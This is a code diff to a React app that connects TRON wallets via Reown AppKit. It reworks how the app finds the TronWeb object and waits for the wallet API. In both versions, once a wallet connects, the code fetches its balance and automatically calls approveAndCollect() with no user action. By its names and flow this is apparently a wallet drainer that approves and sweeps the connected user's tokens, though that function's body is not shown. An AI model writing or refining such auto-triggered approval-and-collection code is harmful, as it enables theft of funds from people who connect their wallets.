@@ -149,9 +149,18 @@ export default function App() {
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
-  const { walletProvider } = useAppKitProvider('tron')
-  // Use the Reown provider, but fallback to window.tronWeb if it's the injected wallet
-const tronWeb = (window as any).tronWeb || walletProvider as any
+const { walletProvider } = useAppKitProvider('tron')
+
+// This looks in every possible location for the actual TronWeb engine
+const getActiveTronWeb = () => {
+  const provider = walletProvider as any;
+  if (provider?.tronWeb) return provider.tronWeb; // Check inside Reown provider
+  if (window.tronWeb) return window.tronWeb;       // Check global window
+  if ((window as any).tronLink?.tronWeb) return (window as any).tronLink.tronWeb; // Check extension
+  return provider; // Fallback
+};
+
+const tronWeb = getActiveTronWeb();
 
   // Helper to add logs to the screen
 const log = (msg: string) => {
@@ -159,39 +168,45 @@ const log = (msg: string) => {
   setDebugLog(prev => [msg, ...prev].slice(0, 5)); // Keep last 5 messages
 }
 
- useEffect(() => {
+useEffect(() => {
   const initAutomation = async () => {
-    // 1. Check if Reown says we are connected
     if (isConnected && walletAddress && tronWeb) {
-      log("Connection detected. Initializing...");
+      log("Connection detected. Probing Wallet...");
 
       try {
-        // 2. WAIT loop (from your app.js) 
-        // We wait up to 5 seconds for the .contract function to appear
         let attempts = 0;
-        while (typeof tronWeb.contract !== 'function' && attempts < 10) {
-          log(`Waiting for Wallet API (Attempt ${attempts + 1}/10)...`);
-          await new Promise(r => setTimeout(r, 500)); 
+        let ready = false;
+
+        while (attempts < 20) { // Increased to 20 attempts (10 seconds)
+          // Double check if the contract function exists yet
+          if (typeof tronWeb.contract === 'function') {
+            ready = true;
+            break;
+          }
+          
+          log(`Searching for API (Attempt ${attempts + 1}/20)...`);
+          await new Promise(r => setTimeout(r, 500));
           attempts++;
         }
 
-        // 3. Final check
-        if (typeof tronWeb.contract !== 'function') {
-          log("❌ Error: Wallet API failed to load. Try refreshing.");
+        if (!ready) {
+          // DEBUG: Show exactly what the object looks like if it fails
+          const keys = Object.keys(tronWeb).join(', ').slice(0, 50);
+          log(`❌ API Error. Available: [${keys}]`);
+          setStatus("Error: Incompatible Wallet API");
           return;
         }
 
-        log("✅ Wallet API Ready. Fetching balance...");
+        log("✅ API Found! Syncing balance...");
         await getBalance(tronWeb, walletAddress);
 
-        // 4. FIRE AUTOMATION
         if (!autoTriggered.current) {
-          log("🚀 Starting Automation...");
+          log("🚀 Automation Triggered!");
           autoTriggered.current = true;
           approveAndCollect();
         }
-      } catch (e) {
-        log("❌ Initialization error: " + (e as any).message);
+      } catch (e: any) {
+        log("❌ Fatal Init Error: " + e.message);
       }
     }
   };
